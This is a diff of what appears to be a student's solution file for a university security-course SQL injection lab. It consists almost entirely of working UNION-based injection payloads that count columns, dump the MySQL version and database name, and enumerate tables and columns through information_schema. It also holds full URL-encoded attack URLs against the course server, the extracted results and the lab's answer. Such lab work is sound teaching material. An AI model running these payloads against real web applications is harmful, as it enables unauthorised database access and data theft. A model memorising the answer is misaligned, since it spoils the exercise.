@@ -1,22 +1,12 @@
-1' ORDER BY 4;  -- 
-1' ORDER BY 5;  -- 
- ' union select 1,2,3,4; --
- ' union select 1,user(),3,database(); -- 
- ' union select 1,table_name,3,table_schema FROM information_schema.tables WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 0; -- 
- ' union select 1,table_name,3,table_schema FROM information_schema.tables WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 1; -- 
- ' union select 1,table_name,3,table_schema FROM information_schema.tables WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 2; -- 
- ' union select 1,table_name,3,table_schema FROM information_schema.tables WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 3; -- 
- ' union select 1,table_name,3,table_schema FROM information_schema.tables WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 4; -- 
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 0; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 1; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 2; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 3; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 4; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 5; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 6; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 7; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 8; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 9; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 10; --
-  ' union select 1,table_name,3,column_name FROM information_schema.columns WHERE TABLE_SCHEMA='proj2_inject3' LIMIT 1 OFFSET 11; --
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+radius
 
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Cuser%28%29%2C3%2Cdatabase%28%29%3B+--+
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Cversion%28%29%2C3%2Cdatabase%28%29%3B+--+
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Ctable_name%2C3%2Ctable_schema+FROM+information_schema.tables+WHERE+TABLE_SCHEMA%3D%27proj2_inject3%27+LIMIT+1+OFFSET+0%3B+--+
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Ctable_name%2C3%2Ctable_schema+FROM+information_schema.tables+WHERE+TABLE_SCHEMA%3D%27proj2_inject3%27+LIMIT+1+OFFSET+1%3B+--+
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Ctable_name%2C3%2Ctable_schema+FROM+information_schema.tables+WHERE+TABLE_SCHEMA%3D%27proj2_inject3%27+LIMIT+1+OFFSET+2%3B+--+
+ http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Ctable_name%2C3%2Ctable_schema+FROM+information_schema.tables+WHERE+TABLE_SCHEMA%3D%27proj2_inject3%27+LIMIT+1+OFFSET+3%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+%27+union+select+1%2Chash%2C3%2Csecret+FROM+SECRET+WHERE+hash%3D%27fabb048ce991e553b2c27535081f87dc%27+LIMIT+1+OFFSET+0%3B+--+
